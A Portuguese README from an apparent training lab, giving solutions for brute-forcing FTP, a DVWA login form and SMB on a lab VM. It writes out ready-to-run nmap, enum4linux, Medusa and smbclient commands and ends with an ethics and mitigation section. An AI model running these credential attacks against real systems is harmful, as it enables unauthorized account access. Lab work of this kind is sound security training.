# Soluções — Desafio Cyber Test (Kali + Medusa)

Este README contém **apenas** as soluções objetivas para cada cenário proposto (FTP, Web/DVWA, SMB) — comandos usados e formas de validação. Arquivos auxiliares (wordlists) foram mantidos separadamente.

---

## 1) FTP — Força Bruta com Medusa

**Comando (varredura de serviço):**

```bash
nmap -sV -p 20,21 192.168.0.6
```

**Wordlists usadas:**

* `users.txt`
* `password.txt`

**Comando (Medusa):**

```bash
medusa -h 192.168.0.6 -U users.txt -P password.txt -M ftp -t 6 > outputs/ftp_credenciais.txt
```

**Validação:**

* Verificar `outputs/ftp_credenciais.txt` por linhas com `SUCCESS`/`ACCOUNT FOUND`.
* Login manual para confirmar (`ftp 192.168.0.6` → usuário/senha obtidos) e listar arquivos com `ls`.

---

## 2) DVWA (Web) — Ataque a formulário (FORM)

**Observação:** confirme o endpoint e a string de falha do DVWA antes de rodar.

**Comando (Medusa FORM):**

```bash
medusa -h 192.168.0.6 -U users.txt -P password.txt \
 -M http -m FORM:POST:/dvwa/login.php \
 -m FORM-DATA:"username=^USER^&password=^PASS^&Login=Login" \
 -m FAIL:"Login failed" \
 -T 10 -t 5 > outputs/dvwa_medusa.txt
```

**Validação:**

* Conferir `outputs/dvwa_medusa.txt` por indicações de sucesso.
* Acessar via navegador e confirmar redirecionamento/painel do DVWA após login com as credenciais encontradas.
* Capturar tela do painel (redigida) como evidência.

---

## 3) SMB — Enumeração e Password Spraying

**Varredura e enumeração:**

```bash
nmap -v -p 445 192.168.0.6
enum4linux -a 192.168.0.6 | tee outputs/enum4_output.txt
```

**Password spraying / brute force SMB (Medusa):**

```bash
medusa -h 192.168.0.6 -U users.txt -P password.txt -M smbnt -t 2 -T 50 > outputs/smb_medusa.txt
```

**Validação (acesso a shares):**

```bash
smbclient -L //192.168.0.6 -U <usuario_encontrado>
# ou, para conectar a um share:
# smbclient //192.168.0.6/<share> -U <usuario_encontrado>
```

* Confirme que a listagem de shares é exibida e/ou que foi possível acessar um share autenticado.

---

## Observações rápidas de segurança e ética

* Testes realizados apenas em VMs autorizadas.
* **Não** subir arquivos com senhas reais no GitHub. Mantenha saídas redigidas.

---

## O que eu aprendi

Este desafio me ajudou a entender, na prática, o fluxo completo de auditoria de autenticação: **identificar serviços**, **criar/usar wordlists**, **executar ataques automatizados com Medusa**, e **validar acessos** de forma controlada — além de reforçar a importância de mitigação (lockout, MFA, monitoramento) e da responsabilidade ética em testes de segurança.

---

*Arquivo gerado para publicação pública: README resumido com soluções diretas e evidências redigidas.*
